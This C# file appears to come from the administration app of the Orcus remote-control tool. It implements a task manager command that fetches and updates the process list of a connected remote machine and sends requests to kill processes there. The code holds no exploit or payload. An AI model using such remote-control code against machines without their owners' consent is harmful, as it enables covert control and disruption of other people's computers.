using System;
using Orcus.Shared.Communication;
using Orcus.Shared.Commands.FunActions;
using System.Text;
using System.Linq;
using System.Collections.Generic;
using Orcus.Shared.Commands.TaskManager;
using Android.Graphics;
using Orcus.Shared.NetSerializer;

namespace Orcus.Administration.App
{
	class TaskManagerCommand : Command
	{
		public List<AdvancedProcessInfo> Processes { get; set; }

		public event EventHandler<List<AdvancedProcessInfo>> RefreshList;
		public event EventHandler TaskKillFailed;
		public event EventHandler TaskKilled;

		public override void ResponseReceived (byte[] parameter)
		{
			Serializer serializer;
			switch ((TaskManagerCommunication) parameter[0])
			{
			case TaskManagerCommunication.ResponseFullList:
				if (Processes != null)
					Processes.ToList ().ForEach (x => x.Dispose ());
				serializer = new Serializer (typeof(List<AdvancedProcessInfo>));
				Processes =
					new List<AdvancedProcessInfo> (
					serializer.Deserialize<List<AdvancedProcessInfo>> (parameter, 1));
				if (RefreshList != null)
					RefreshList.Invoke (this, Processes);
				break;
			case TaskManagerCommunication.ResponseChanges:
				serializer = new Serializer (typeof(ProcessListChangelog));
				var changelog = serializer.Deserialize<ProcessListChangelog> (parameter, 1);

				foreach (
					var process in
					changelog.ClosedProcesses.Select(
						closedProcess => Processes.FirstOrDefault(x => x.Id == closedProcess))
					.Where(process => process != null)) {
					process.Dispose ();
					Processes.Remove (process);
				}
				foreach (var processInfo in changelog.NewProcesses)
					Processes.Add (new AdvancedProcessInfo (processInfo));

				if (RefreshList != null)
					RefreshList.Invoke (this, Processes);
				break;
			case TaskManagerCommunication.ResponseTaskKillFailed:
				if (TaskKillFailed != null)
					TaskKillFailed.Invoke (this, EventArgs.Empty);
				break;
			case TaskManagerCommunication.ResponseTaskKilled:
				if (TaskKilled != null)
					TaskKilled.Invoke (this, EventArgs.Empty);
				break;
			default:
				return;
			}
		}

		public void Refresh(){
			ConnectionInfo.SendCommand(this,
				new[]
				{
					Processes == null
					? (byte) TaskManagerCommunication.SendGetFullList
						: (byte) TaskManagerCommunication.SendGetChanges
				});
		}

		public void KillProcess(AdvancedProcessInfo processInfo)
		{
			var package = new List<byte> {(byte) TaskManagerCommunication.SendKill};
			package.AddRange(BitConverter.GetBytes(processInfo.Id));
			ConnectionInfo.SendCommand(this, package.ToArray());
		}

		protected override uint GetId ()
		{
			return 16;
		}
	}

	[Serializable]
	public class AdvancedProcessInfo : ProcessInfo, IDisposable
	{
		[NonSerialized] private Bitmap _icon;

		public AdvancedProcessInfo()
		{
		}

		public AdvancedProcessInfo(ProcessInfo processInfo)
		{
			Name = processInfo.Name;
			Description = processInfo.Description;
			CompanyName = processInfo.CompanyName;
			WorkingSet = processInfo.WorkingSet;
			PrivateBytes = processInfo.PrivateBytes;
			IconBytes = processInfo.IconBytes;
			Id = processInfo.Id;
			StartTime = processInfo.StartTime;
			CanChangePriorityClass = processInfo.CanChangePriorityClass;
			PriorityClass = processInfo.PriorityClass;
		}

		public void Dispose()
		{
			if (_icon != null)
				_icon.Dispose ();
		}

		public Bitmap Icon
		{
			get
			{
				if (_icon != null)
					return _icon;

				if (IconBytes == null)
					return null;

				return _icon = BitmapFactory.DecodeByteArray (IconBytes, 0, IconBytes.Length);
			}
		}
	}
}